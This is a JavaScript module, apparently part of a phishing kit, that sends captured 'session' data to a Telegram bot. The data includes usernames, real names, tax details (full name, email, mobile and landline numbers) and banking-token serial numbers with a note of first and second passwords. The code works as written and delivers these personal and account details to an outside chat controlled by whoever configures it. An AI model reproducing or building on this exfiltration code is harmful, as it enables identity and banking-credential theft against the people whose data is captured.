import https from 'https'

let telegramBotToken = null
let telegramChatId = null

// Función para configurar tokens de Telegram
function setTelegramConfig(botToken, chatId) {
  telegramBotToken = botToken
  telegramChatId = chatId
}

// Función para obtener configuración actual
function getTelegramConfig() {
  return {
    botToken: telegramBotToken,
    chatId: telegramChatId,
    configured: !!(telegramBotToken && telegramChatId)
  }
}

// Función para enviar mensaje a Telegram
function sendTelegramMessage(message, parseMode = 'HTML') {
  if (!telegramBotToken || !telegramChatId) {
    console.log('⚠️ Telegram no configurado, mensaje no enviado')
    return Promise.resolve(false)
  }

  const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`
  
  const data = JSON.stringify({
    chat_id: telegramChatId,
    text: message,
    parse_mode: parseMode
  })

  return new Promise((resolve, reject) => {
    const options = {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': data.length
      }
    }

    const req = https.request(url, options, (res) => {
      let responseData = ''
      
      res.on('data', (chunk) => {
        responseData += chunk
      })
      
      res.on('end', () => {
        if (res.statusCode === 200) {
          console.log('✅ Mensaje enviado a Telegram')
          resolve(true)
        } else {
          console.error('❌ Error al enviar a Telegram:', responseData)
          resolve(false)
        }
      })
    })

    req.on('error', (error) => {
      console.error('❌ Error de conexión Telegram:', error)
      resolve(false)
    })

    req.write(data)
    req.end()
  })
}

// Función para formatear datos de sesión para Telegram
function formatSessionMessage(sessionData, eventType = 'Nueva sesión') {
  const sessionId = sessionData.sessionId || sessionData.idSesion || 'N/A'
  
  let message = `🔔 <b>${eventType}</b>\n\n`
  message += `🆔 <b>ID Sesión:</b> <code>${sessionId}</code>\n`
  
  if (sessionData.userName) {
    message += `👤 <b>Usuario:</b> ${sessionData.userName}\n`
  }
  
  if (sessionData.realName) {
    message += `📝 <b>Nombre:</b> ${sessionData.realName}\n`
  }
  
  if (sessionData.taxData) {
    message += `\n💼 <b>Datos Fiscales:</b>\n`
    message += `   • Nombre: ${sessionData.taxData.fullName || 'N/A'}\n`
    message += `   • Email: ${sessionData.taxData.email || 'N/A'}\n`
    message += `   • Teléfono Móvil: ${sessionData.taxData.mobilePhone || 'N/A'}\n`
    message += `   • Teléfono Fijo: ${sessionData.taxData.landlinePhone || 'N/A'}\n`
  }
  
  if (sessionData.tokenSerial) {
    message += `\n🔐 <b>Token Sync:</b>\n`
    message += `   • Número de Serie: <code>${sessionData.tokenSerial}</code>\n`
    if (sessionData.tokenPasswords) {
      message += `   • Primera Contraseña: <code>${'*'.repeat(6)}</code>\n`
      message += `   • Segunda Contraseña: <code>${'*'.repeat(6)}</code>\n`
    }
  }
  
  message += `\n⏰ <b>Fecha:</b> ${new Date().toLocaleString('es-MX')}`
  
  return message
}

export { setTelegramConfig, getTelegramConfig, sendTelegramMessage, formatSessionMessage }


